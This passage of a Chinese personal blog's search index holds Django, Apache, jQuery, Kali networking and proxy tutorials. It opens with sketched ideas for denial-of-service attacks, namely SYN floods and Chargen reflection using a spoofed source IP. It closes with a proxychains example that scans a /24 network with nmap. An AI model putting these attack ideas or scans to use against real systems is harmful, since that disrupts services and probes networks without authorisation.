利用HTTP协议的特性进行拒绝服务攻击的一些构思服务器端忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小），此时从正常客户的角度看来，服务器失去响应，这种情况我们称作：服务器端受到了SYNFlood攻击（SYN洪水攻击） 19端口在早期已经有人用来做Chargen攻击了，即Chargen_Denial_of_Service，但是！他们用的方法是在两台Chargen 服务器之间产生UDP连接，让服务器处理过多信息而DOWN掉，那么，干掉一台WEB服务器的条件就必须有2个：1.有Chargen服务2.有HTTP 服务方法：攻击者伪造源IP给N台Chargen发送连接请求（Connect），Chargen接收到连接后就会返回每秒72字节的字符流（实际上根据网络实际情况，这个速度更快）给服务器。 Http指纹识别技术要让服务器返回不同的Banner信息的设置是很简单的,象Apache这样的开放源代码的Http服务器,用户可以在源代码里修改Banner信息,然 后重起Http服务就生效了；对于没有公开源代码的Http服务器比如微软的IIS或者是Netscape,可以在存放Banner信息的Dll文件中修改。而另外一种模糊Banner信息的方法是使用插件。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Django博客(4)View,Urls]]></title>
      <url>%2F2016%2F08%2F10%2FDjango%E5%8D%9A%E5%AE%A2(4)View%2CUrls%2F</url>
      <content type="text"><![CDATA[0x01 网页逻辑 url设置相当于客户端向服务器发出request请求的入口, 并用来指明要调用的程序逻辑 views用来处理程序逻辑, 然后呈现到template(一般为GET方法, POST方法略有不同) models用封装和处理数据库相关操作和数据 template一般为html+CSS的形式, 主要是呈现给用户的表现形式 0x02 view 和 urls先在 my_blog/article/view 中添加如下代码: 12 为了将上述 view 逻辑在 http 请求时被调用，便需要在 articel/urls 中进行配置。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Django博客(3)Admin]]></title>
      <url>%2F2016%2F08%2F10%2FDjango%E5%8D%9A%E5%AE%A2(3)Admin%2F</url>
      <content type="text"><![CDATA[0x00 创建admin账号运行如下命令创建admin账号 12345$ python manage.py createsuperuserUsername (leave blank to use &apos;root&apos;): jackEmail address: 1234@gmail.comPassword: qwer7890Password (again): 更具提示输入admin的名称，邮箱，密码。 最后启动服务器，访问 IP:8080/amdin，就可以进入管理员页面了。 将app 注册到Django管理员站点编辑 article/admin.py 添加如下代码： 12345from django.contrib import adminfrom article.models import Article# Register your models here.admin.site.register(Article) 启动Diango服务器，便可以对 Article 站点页面进行页面管理了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Django博客(1)Apache2]]></title>
      <url>%2F2016%2F08%2F05%2FDjango%E5%8D%9A%E5%AE%A2(1)Apache2%2F</url>
      <content type="text"><![CDATA[0x00 部署前的准备假设你已经有了一个云服务器，并且操作系统是 Ubuntu 14.4。 首先添加一个新的非 root 账号，为了安全起见，并为其赋予 sudo 权限。 1sudo adduser onejustone 123vim /etc/sudoers#在 root ALL=(ALL:ALL)ALL 下添加onejustone ALL=(ALL:ALL)ALL 切换用户到 onejustone 1su onejustone 安装 virtualenvvirtualenv 算是 Python 世界中的几大神器之一。 12345678#安装 virtualenvsudo apt-get install python-virtualenv#创建一个新的虚拟环境,名为 ENVvirtualenv ENV#启动 ENVsource ENV/bin/activate 在虚拟环境中安装 Django 1(ENV)onejustone@ubuntu:~$:pip install django 如需退出虚拟环境，使用: 1(ENV)onejustone@ubuntu:~$:deactivate 0x01 安装数据库和 HTTP 服务器12345#安装 mysql 服务器sudo apt-get install mysql-server#安装客户工具sudo apt-get install libmysqlclient-dev 123#安装 apache2 以及 mod-wsgisudo apt-get install apache2sudo apt-get install libapache2-mod-wsgi 0x02 开启 Django由于我们使用了virtualenv来安装Django，所以Django并不在系统的默认路径上。为了让系统正常运行，还需要在wsgi.py中加入： 1234import sys# 加入virtualenv的路径sys.path.append(&apos;/home/onejustone/ENV/lib/python2.7/site-packages&apos;) 0x03 创建Django 项目创建一个 my_blog 的Django 项目1$ django-admin.py startproject my_blog 创建一个 article app1$ python manage.py startapp article 在 my_blog/my_blog/setting.py 下添加新建app1234INSTALLED_APPS = ( ... &apos;article&apos;, #这里填写的是app的名称) 在 my_blog/my_blog/urls.py 中配置 url123456from django.conf.urls import url, includefrom django.contrib import adminurlpatterns = [ url(r&apos;^admin/&apos;, admin.site.urls), url(r&apos;^article/&apos;, include(&apos;article.urls&apos;)), 在my_blog/article 中添加一个新的 urls.py 文件12345from django.conf.urls import urlfrom article import viewsurlpatterns = [ url(r&apos;^$&apos;, view.first_page, name=&apos;first_age&apos;), 在article/views.py 中添加如下业务代码1234from django.shortcuts import renderfrom django.http import HttpResponsedef first_page(request): return HttpResponse(&quot;&lt;p&gt;hello, world&lt;/p&gt;&quot;) 0x04 配置 Apach2在apache的配置文件/etc/apache2/apache2.conf中增加下面的配置： 12345678910111213# DjangoWSGIScriptAlias / /home/onejustone/my_blog/my_blog/wsgi.py#django 自带的 wsgi.py 文件WSGIPythonPath /home/onejuston/my_blog#django 项目所在位置&lt;Directory /home/onejustone/my_blog/my_blog&gt;#站点位置&lt;Files wsgi.py&gt; Order deny,allow Require all granted&lt;/Files&gt;&lt;/Directory&gt; 利用WSGIScriptAlias，我们实际上将URL / 对应了wsgi接口程序。这样，当我们访问根URL时，访问请求会经由WSGI接口，传递给Django 项目 mysite。 重启 apache2 1sudo /etc/init.d/apache2 restart Ok,现在可以访问到我们的 Django 站点了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端实战(3)-设计一个导航条]]></title>
      <url>%2F2016%2F08%2F04%2F%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%88%98(3)-%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%AF%BC%E8%88%AA%E6%9D%A1%2F</url>
      <content type="text"><![CDATA[0x01 相关方法与属性 box-shadow属性box-shdow属性拥有5个参数，从左到右，依次为x轴偏移量，y轴偏移量，阴影模糊半径，阴影颜色和阴影类型(内阴影或外阴影，默认为外阴影) 1234#page-wrap&#123; box-shadow:0px 0px 2px #62615f inset; /*向盒子设置内阴影*/&#125; jQuery的appendTo()方法appendTo()方法用于在被选中的元素末插入指定的内容 1jQuery(&apos;&lt;p&gt;插入在body元素的末尾&lt;/p&gt;).appendTo(&apos;body&apos;); 于此类似的append()方法，但是A append B是将B插入到A元素的末尾，而A appendTo B是将A插入到B的末尾。 jQuery的CSS方法使用jQuery的CSS方法时，CSS属性与值要使用逗号分隔开。 1jQuery(&apos;对象元素&apos;).css(&apos;color&apos;,&apos;red&apos;); 若是两个以上的属性，则只需要给css()方法CSS Map类型的对象枚举就好了。 1234jQuery(&apos;#page-wrap&apos;).css(&#123; &apos;color&apos;:&apos;red&apos;, &apos;font-size&apos;:&apos;24px&apos;,&#125;); jQuery的find()方法用于在DOM中查找指定的对象 12jQuery(&apos;ul&apos;).find(&apos;li:last&apos;);//查找ul中的最后一li元素 jQuery Easing插件这是一个动画效果插件。 http://www.helloweba.com/view-blog-212.html 下载源代码并引用jQuery.easing.min.js到项目中，然后在jQuery的animate属性中添加动画参数值就可以了。 再谈animate方法animate()方法除了传递CSS样式属性及其值得集合外，另一个参数便是包涵时间，easing，回调函数和队列等的集合。 jQuery(‘p:last’).animate({[css集合]},{[动画的额外选项]}) 123jQuery(&apos;p:last&apos;).animate(&#123;&apos;color&apos;:&apos;red&apos;,&apos;font-size&apos;:&apos;2px&apos;&#125;,&#123;duration:400,easing:&apos;easein&apos;,complete:function()&#123;&#125;&#125;); setTimeout()方法setTimeout()方法用于在指定的毫秒数后调用函数或者计算表达式。 12345.bing(&apos;mouseout focusout&apos;,function()&#123; setTimeout(function()&#123; $lava.animate(&#123;css&#125;,&#123;&#125;,200);//设置动画执行时间 &#125;,2000);//设置setTimeout时间&#125;); 0x01 代码实例导航条的html代码123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;lamalampnavigation&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;lavalamp.css&quot;/&gt; &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;jquery.easing.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;lavalamp.js&quot;&gt;&lt;/script&gt; &lt;!--&lt;script src=&quot;jQuery.lavalamp.js&quot;&gt;&lt;/script&gt;--&gt; &lt;!--&lt;script type=&quot;text/javascript&quot;&gt;--&gt; &lt;!--(function($)&#123;--&gt; &lt;!--$(function()&#123;--&gt; &lt;!--$(&apos;#navigation&apos;).lavalamp();--&gt; &lt;!--&#125;);--&gt; &lt;!--&#125;)(jQuery);--&gt; &lt;!--&lt;/script&gt;--&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;page-wrap&quot;&gt; &lt;!--使用包裹元素，将h1，p和nav三个元素包裹起来--&gt; &lt;h1&gt;Lava Lamp Style Navigation Design&lt;/h1&gt; &lt;p&gt;菩提本无树，明镜亦非台&lt;/p&gt; &lt;!--使用H5新增加的&lt;nav&gt;元素定义页面上的导航条并使用&lt;ul&gt;&lt;li&gt;列出所有导航项目--&gt; &lt;!--设置&lt;ul&gt;的class属性为&quot;clearfix&quot;，使其能够包裹被设置为float的元素--&gt; &lt;nav id=&quot;navigation&quot;&gt; &lt;ul class=&quot;clearfix&quot;&gt; &lt;li class=&quot;focus&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a&gt;Source&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a&gt;Lecture Open&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a&gt;WeBlog&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a&gt;About&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 导航条CSS代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990@import url(https://fonts.googleapis.com/css?family=Montez);body&#123; background:#eeece7; /*背景亮灰色*/&#125;h1&#123; font:52px/1 &apos;Montez&apos;; color:#a4834d; /*浅褐色*/&#125;/*控制导航条的边框演示*/h1+p&#123; /*使用+选择符，查找紧接在&lt;h1&gt;之后的p水元素*/ margin-bottom:3.5em; /*下外边边距为字高的3.5倍*/&#125;#page-wrap&#123; width:960px; margin:30px auto; /*上下外边距是30px，左右边距为auto*/ padding:3em; /*内边距为字高的3倍*/ background:#fff; /*背景为亮白色*/ box-shadow:0px 0px 2px #62615f inset; border-radius:20px;&#125;/*控制导航条的菜单项样式*/#navigation&#123; padding:3px;&#125;/*设置li选项*/#navigation li&#123; list-style: none; float:left; /*向右浮动*/ border-right:1px solid #eee; /*设置右边框*/&#125;/*设置各个单项菜单项的超链接样式*/#navigation li a&#123; border:0; /*设置*边框为0，将其隐藏*/ padding:10px; /*设置内边距为10px*/ font: 14px/1 Verdana; color:#a49e96;&#125;/*去掉最后一个li元素的右边框*/#navigation li:last-child&#123; border:0; /*使用:last-child伪类，查找到#navigation的最后一个列表元素*/&#125;/*控制导航样式，渐变*//*#navigation li a:hover,*//*#navigation li a:focus,*//*#navigation li.focus a&#123;*/ /*!*li.focus a指定默认选项*!*/ /*border-radius:10px;*/ /*background-image:linear-gradient(-90deg,#aaa,#fff);*/ /*!*设置CSS3渐变效果*!*/ /*-webkit-box-shadow: 0px 0px 2px #69635a;*/ /*-moz-box-shadow: 0px 0px 2px #69635a ;*/ /*box-shadow: 0px 0px 2px #69635a ;*//*&#125;*//*为lava添加渐变效果*/.lava&#123; border-radius:10px; background-image:linear-gradient(-90deg,#aaa,#fff); /*设置CSS3渐变效果*/ -webkit-box-shadow: 0px 0px 2px #69635a; -moz-box-shadow: 0px 0px 2px #69635a ; box-shadow: 0px 0px 2px #69635a ;&#125; 导航条jQuery代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768(function($)&#123; //js自运行函数 $(function()&#123;//jquery ready()语句 options =&#123; //创建命名空间，方便后期维护和修改 gap:20, speed:100, easing:&apos;easeInOutElastic&apos;, reset:200, bgColor:&apos;#eee&apos; &#125;; var $nav= $(this), $current_itm =$nav.find(&apos;.focus&apos;), $lava=$(&apos;&lt;li class=&quot;lava&quot;/&gt;&apos;), reset; $lava.appendTo($nav.find(&apos;ul&apos;)); //将$lava插入到$nav&lt;ul&gt;之后 $lava.css(&#123; width: $current_itm.outerWidth(), height: $current_itm.outerHeight()+options.gap, backgroundColor:options.bgColor &#125;); //&#125;).appendTo($nav.find(&apos;ul&apos;)); $nav.css(&apos;position&apos;,&apos;relative&apos;); $lava.css(&#123; position:&apos;absolute&apos;, top:$current_itm.position().top-(options.gap/2),//将top设置为focus的top值 left:$current_itm.position().left//将left设置为focus的left值，如此，lava便在focus的位置上了 &#125;); $nav.css(&apos;position&apos;,&apos;relative&apos;).find(&apos;a&apos;).css(&#123; //在$nav中查找&lt;a&gt;并添加演示 position:&apos;relative&apos;,//设置为相对定位 zIndex:1//设置沿z轴的位置 &#125;); $nav.find(&apos;li&apos;) .bind(&apos;mouseover focusin&apos;,function()&#123; $lava.animate(&#123;//向$lava设置动画 left:$(this).position().left, width:$(this).outerWidth() &#125;,&#123; duration:options.speed, easing:options.easing, queue:false &#125;); //.bind(&apos;mouseout focusout&apos;,function()&#123;//li失去焦点时的处理代码 // setTimeout(function () &#123; // $lava.animate(&#123; // left:$current_itm.position().left, // width:$current_itm.outerWidth() // &#125;,10); // // &#125;,10); //&#125;); &#125;); &#125;);&#125;)(jQuery); 0x01 制作导航jQuery插件首先创建jQuery插件。在js文件夹中新建一个jquery.lavalamp.js文件，编写jQuery的基本代码。 js支持原生类型(prototype)的继承，jQuery是一个js库，所以它也是支持的。jQuery.fn是jQuery对象的prototype的样式表现，以jQuery.fn的形式对jQuery进行插件扩展。 123456789101112/** * Created by jack on 2016/8/6. * 制作一个导航条插件/ *;(function($)&#123; $.fn.lavalamp = function(options)&#123;//lavalamp便是插件名 options=$.extend(&#123; &#125;,options); return this.each(function()&#123; &#125;); &#125;);&#125;)(jQuery);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端实战(4)-设计气泡按钮]]></title>
      <url>%2F2016%2F08%2F03%2F%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%88%98(4)-%E8%AE%BE%E8%AE%A1%E6%B0%94%E6%B3%A1%E6%8C%89%E9%92%AE%2F</url>
      <content type="text"><![CDATA[0x00 前言按钮是网页中最常用的元素，本次设计灵感来源于盛有碳酸饮料的玻璃瓶。当我们将鼠标指针移动到容器上时，里面会产生大量的气泡，并向四下浮动。于此同时，也会发出声音。 0x01 相关属性与方法LESSLESS是一种动态样式语言，它能赋予CSS动态语言的特性，比如变量，继承，运算和函数等。我们可以使用LESS来重写CSS样式表。 首先下载LESS的js文件: http://lesscss.cn/ 然后在html中引入 12345678910&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;气泡按钮&lt;/title&gt; &lt;link rel=&quot;stylesheet/less&quot; href=&quot;le.less&quot;&gt; &lt;!--引用le.less文件，需要将rel属性设置为&quot;stylesheet/less--&gt; &lt;script src=&quot;less-2.7.1.min.js&quot;&gt;&lt;/script&gt; &lt;!--引入lesss.js文件--&gt; &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;jquery.easing.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt; less-2.7.1.ming.js就是一个将less转换为css代码的一个工具。 LESS函数123.border-radiues(@radius)&#123; border-radius:@radius;&#125; 简要说明，在LESS中定义函数，1.函数名称之前要有一个实心句号,2.小括号内是参数，3.花括号是代码逻辑。 !imporant关键字CSS,全称Cascading Style Sheet，译为“级联样式表”或“层叠样式表”。我们使用样式表，大致分为两种，一种是内联样式(in-line)另一种是外部样式，它们功能相同，但是优先级不同个，内联样式比外部样式拥有更高的优先级。所以我们可以使用关键字!important来提高外部样式的优先级。 0x02 气泡按钮代码示例]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前端实战(2)-设计气泡悬浮框]]></title>
      <url>%2F2016%2F08%2F03%2F%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%88%98(2)-%E8%AE%BE%E8%AE%A1%E6%B0%94%E6%B3%A1%E6%82%AC%E6%B5%AE%E6%A1%86%2F</url>
      <content type="text"><![CDATA[使用google网页字体服务，https://fonts.google.com/ 0x00 相关属性与方法float属性在CSS中，float可以使得任何元素浮动，而浮动元素会生成一个块级框。它与absolute属性比较类似，但是有很大的不同。 1.absolute以父级元素的四个基准点进行定位，而float则只根据left和right，以父级元素左上与右上为基准定位，而不能以坐下或者右下定位。 2.采用absolute属性定位的元素不能被文本包围，而float可以。 absolute是布局属性，所有没有办法确切的保证其与余下的元素不重合在一起。而float则不会。 border-radius属性border-radius有四个属性属性值，它们是按照上左，下右，下右，下左的次序来设置的。若是只设置两个值，则第一值为上左下右，第二个值为上右下左。 123a.tooltip .tooltip-box&#123;borer-radius:15px 0px;/*设置左上角与右下角为15px，右上角与左下角为opx*/ jQuery的animate()方法jQuery中的animate()方法用于给DOM中的元素设置动画效果，它有两个主要的参数，它有两个重要的参数，一个是CSS属性，一个是动画时间，以毫秒为单位。 1jQuery(&apos;body&apos;).animate(&#123;&apos;color&apos;:&apos;red&apos;,&apos;font-size&apos;:&apos;12px&apos;&#125;,400); 0x01 气泡悬浮框实例代码HTML123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;气泡悬浮框&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;tooltip.css&quot;/&gt; &lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;tooltip.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Fade in/out Tooltip Design,CSS3 &amp;jQuery&lt;/h1&gt;&lt;ul class=&quot;gallery-nav&quot;&gt; &lt;li&gt; &lt;a class=&quot;tooltip photo1&quot;&gt; &lt;div class=&quot;tooltip-box&quot;&gt; &lt;!--使用div表示悬浮框--&gt; &lt;h4 class=&quot;tooltip-title&quot; &gt;一个人的北京&lt;/h4&gt; &lt;!--h4表示标题--&gt; &lt;p class=&quot;tooltip-desc&quot;&gt;今天风清云谈，世界如此喧嚣，没有雾霾。。。&lt;/p&gt; &lt;!--p表示提示文本内容--&gt; &lt;/div&gt; &lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a class=&quot;tooltip photo2&quot;&gt; &lt;div class=&quot;tooltip-box&quot;&gt; &lt;h4 class=&quot;tooltip-title&quot;&gt;2008.08.17&lt;/h4&gt; &lt;p class=&quot;tooltip-desc&quot;&gt;有些人一直没机会见， 等有机会见了， 却又犹豫了， 相见不如不见。 有些事一别竟是一辈子，一直没机会做， 等有机会了， 却不想再做了。&lt;/p&gt; &lt;/div&gt; &lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a class=&quot;tooltip photo3&quot;&gt; &lt;div class=&quot;tooltip-box&quot;&gt; &lt;h4 class=&quot;tooltip-title&quot;&gt;故事&lt;/h4&gt; &lt;p class=&quot;tooltip-desc&quot;&gt; 柳原看着她道：这堵墙，不知为什么使我想起地老天荒那一类的话。 &lt;/p&gt; &lt;/div&gt; &lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; CSS代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152@import url(https://fonts.googleapis.com/css?family=Lato);body&#123; padding:150px; /*设置内部空白*/ background: #3c3c3c; /*设置背景色*/&#125;h1&#123; margin-bottom:40px; /*设置h1的下边距为40px*/ font-family: &apos;Lato&apos;, sans-serif; color:#fff; /*设置字体颜色为白色*/&#125;/*设置a.tooltip样式*/a.tooltip&#123; display:block; /*设置a元素为块元素*/ width:120px; height:120px; border:5px solid #4b4b4b; /*暗灰色*/ /*此时显示页面为三个竖直的灰框*/&#125;/*通过ul元素，设定li元素*/.gallery-nav li&#123; list-style: none; /*去掉li的小黑点*/ float: left; /*向左浮动*/ margin-right: 100px; /*设置右边距，以使三个方框之间有一定的间隔*/&#125;/*将方框变成圆角*/a.tooltip&#123; border-radius: 100%; &#125;/*向tooltip圆形框中插入图片*/a.tooltip.photo1&#123; background-image:url(&quot;./Images/a.ico&quot;);&#125;a.tooltip.photo2&#123; background-image:url(&quot;./Images/b.ico&quot;);&#125;a.tooltip.photo3&#123; background-image:url(&quot;./Images/c.ico&quot;);&#125;/*设置图片不重复居中对齐，并且填充圆形框*/a.tooltip&#123; background:#fff no-repeat center; background-size:cover;&#125;/*设置toolip-box样式*/a.tooltip .tooltip-box &#123; width:20em; /*设置宽度为字高的20倍*/ padding:.8em; /*设置内部空间为字高的0.8倍*/ background:#111;&#125;/*控制tooltip-title和tooltip-desc*/a.tooltip .tooltip-title&#123; color:#fff;&#125;a.tooltip .tooltip-desc&#123; margin-bottom:0; /*删除下边距*/ font-size:11px; text-align:justify; /*设置文本对齐方式为两段对齐*/ color: #bcbcbc; /*字体颜色为亮灰色*/&#125;/*以.tooltip为参考，设置tooltip-box为绝对定位*/a.tooltip&#123; position:relative;&#125;a.tooltip .tooltip-box&#123; position:absolute; bottom:135px; /*以底部为基准，上移135px*/ left:50%; /*以左侧为基准，将悬浮提示文本向右移动50%(只是将tooltip-box的起始位置向右移动了50%而已)*/ margin-left:-10.4em; /*将tooltip-box设置到中间位置上(tooltip-box的[(width+padding)/2]*/ /*因为是向左移动，所以为负值*/&#125;/*添加圆角与尾巴*/a.tooltip .tooltip-box&#123; border-radius:15px 0px;&#125;/*设置尾巴*//*由于三角形的尖朝下，因此需要设置上边框，左边框和右边框*/a.tooltip .tooltip-box:before&#123; content:&apos; &apos;; /*使用虚拟元素before和content创建一个空内容*/ position:absolute; bottom:-10px; /*以下边为基准，向外移动10px*/ left:150px; border-top:10px solid #111; border-left:10px solid transparent; border-right:10px solid transparent;&#125;/*制作transition动画*/a.tooltip:hover .tooltip-box,/*当鼠标指到a.tooltip时，选择.tooltip-box*/a.tooltip:focus .tooltip-box/*当a.tooltip获得聚焦时，选择.tooltip-box*/&#123; opacity:1; bottom:90px;&#125;a.tooltip .tooltip-box&#123; opacity:0; -webkit-transition: all .4s ease-in .3s; -moz-transition: all .4s ease-in .3s ; -ms-transition: all .4s ease-in .3s ; -o-transition: all .4s ease-in .3s ; transition: all .4s ease-in .3s ; /*所有属性在0.3秒之后平滑过渡0.4秒*/&#125;a.tooltip:hover,a.tooltip:focus&#123; border-color: #fff;&#125;.clearfix:after&#123; content:&quot;&quot;; display:block; clear:both;&#125; 0x03 使用jQuery实现淡入淡出考虑到低版本的浏览器，大多数根本不兼容CSS3中的高级特性。此时可以使用Modernizr一个开源的JS库来检测浏览器对H5与CSS3特性的支持。 进入Modernizr官网，下载检测脚本库。 jQuery中的基本函数1234567(function($)&#123;//调用JavaScript自运行函数 $(function()&#123;//通过jQuery ready()，当文档准备好以后运行 &#125;,function()&#123;//回调函数，当该函数执行完成以后调用执行 &#125;);&#125;)(jQuery);//在内部使用$代替jQuery 使用js控制气泡悬浮框的样式 12345678910111213141516171819(function($)&#123;//调用JavaScript自运行函数 $(function()&#123;//通过jQuery ready()，当文档准备好以后运行 if(!Modernizr.csstransforms())&#123; //隐藏.tooltip-box元素 $(&apos;.tooltip-box&apos;).fadeTo(10,0); //当鼠标移动到a.tooltip上 $(&apos;a.tooltip&apos;).hover(function ()&#123; $(this).stop().animate(&#123;&apos;border-color&apos;:&apos;#fff&apos;&#125;,400) .find(&apos;.tooltip-box&apos;).stop().animate(&#123;&apos;opacity&apos;:1,&apos;bottom&apos;:&apos;90px&apos;&#125;,400); &#125;,function()&#123; //当鼠标移出时执行的动作 $(this).stop().animate(&#123;&apos;border&apos;:&apos;#4b4b4b&apos;&#125;,400) .find(&apos;.tooltip-box&apos;).stop().animate(&#123;&apos;opacity&apos;:0,&apos;bottom&apos;:&apos;100px&apos;&#125;,400); &#125;); &#125; &#125;,function()&#123;//回调函数，当该函数执行完成以后调用执行 &#125;);&#125;)(jQuery);//在内部使用$代替jQuery]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Kali网络配置]]></title>
      <url>%2F2016%2F07%2F31%2FKali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[0x00 Kali 网络配置当在一个有DHCP服务器的网络环境中，kali会自动获取到IP地址，如果获取失败则将手动配置网络。 临时ip地址(电脑重启后失效)自动获得ip地址： 1$ dhclient eth0 手动获得ip地址： 1$ ifconfig eth0 192.168.1.10/11 查看网络配置: 1$ ifconfig eth0 添加网关: 1$ route add default gw 192.168.1.1 查看： 1$ netstat -nr 静态路由的添加并指定网卡: 1$ route add -net 192.168.0.0/24 gw 192.168.1.100 eth0 编辑DNS: 1$ echo nameserver 8.8.8.8 &gt; /etc/resolv.conf 重启网卡: 1$ /etc/init.d/networking restart 重启网络管理: 1$ /etc/init.d/network-manager restart 设置固定ip编辑网卡配置文件路径: 1234567891011$ vi /etc/network/interfaces allow hotplug eth0 iface eth0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.254 dns-nameservers 192.168.0.10 8.8.8.8#auto lo #iface to inet loop back 当然也可以安装wicd，它可是比系统自带的network-manager好用多了： 1234$ apt-get install wicd$ /etc/init.d/network-manager stop //停用network-manager$ update-rc.d network-manager disable //禁止network-manager开机启动$ wicd-client //启动wicd]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Kali Proxy]]></title>
      <url>%2F2016%2F07%2F31%2FKali-Proxy%2F</url>
      <content type="text"><![CDATA[0x00 XXNET详细配置可以参考官方文档: https://github.com/XX-net/XX-Net Google APPID1goagent5-143111|goagent4-143111|goagent3-143111|goagent2-143111|goagent1-143111|goagent-143111 Firefox 需手动导入证书 data/gae_proxy/CA.crt 启动后生成。 0x01 ShadowSocks删除ShadowSocks本地缓存: 1$: cd /root/.config/shadowsocks-gui/Local\ Storage/ 0x02 TorKali tor安装 http://www.blackmoreops.com/2013/12/16/installing-tor-kali-linux/ Tor官网 https://www.torproject.org/download/download-easy.html.en 暗网wiki http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main.Page kali 下 Tor 启动问题should not be run as root解决:在 tor-browser_zh-CN 目录下打开 browser文件夹，选择 start-tor-browser 文件，使用 gedit 打开，（ctrl+f查找root，将{“id -u”-eq 0}中的“0”改为 “1“）。 再次运行出现错误2：“Tor意外退出”：权限问题导致，需将Tor目录的权限改为root账号，chown -R root:root tor-browser_zh_CN !Note \最大化tor browser窗口之后，网站可以获取显示器尺寸信息，从而跟踪用户！ 0x03 命令行Proxy对 apt-get 添加代理设置如果使用的是 XX-NET 代理，可在 /etc/apt/apt.conf 文件中添加如下内容: 1Acquire::http::Proxy &quot;http://127.0.0.1:8087&quot;; 此外，同样但不限于以下方法: 123#Acquire::ftp::Proxy&quot;ftp://127.0.0.1:8087&quot;;#Acquire::https::Proxy&quot;https://127.0.0.1:8087&quot;;#Acquire::socks::Proxy&quot;https://127.0.0.1:8087&quot;; 添加 export 对不支持Proxy的程序使用代理编辑 /etc/bash.bashrc 文件，在末尾添加如下内容: 1export http_proxy=&quot;http://127.0.0.1:8087&quot; 使用 curl 命令进行验证 1 root ~ 1 curl -v http://www.sina.com 终极武器 proxychains以上所有的方法都决定了一次只能使用一个代理，即只会进行一次跳转，使用 proxychains 可以一次实现多次跳转。 1 root ~ 1 vim /etc/proxychains.conf proxychains 有三种类型的代理， static , dynamic , random:默认使用 static。12345static: 使用静态代理的方式，按添加代理服务器的地址顺序进行 `串联` 代理，若是其中一个无法连接，则整个代理链无法使用。dynamic: 类似static代理，不过使用 `并联` 的方式，当添加的代理链中的某一个代理服务器无法使用时， 将自动跳过该代理服务器。random : 随机选择代理链中的所有服务器进行代理。 此外，当选择使用 random 代理时，可以指定代理链的长度。不使用默认 DNS 代理设置，以及设置代理连接和超时时间长度等。 设置完毕，当在命令行中使用 proxychains 前缀，便可以对任意程序使用代理链代理了。 1 root ~ 1 proxychains nmap -p80 211.144.145.0/24]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[vega]]></title>
      <url>%2F2016%2F07%2F31%2Fvega%2F</url>
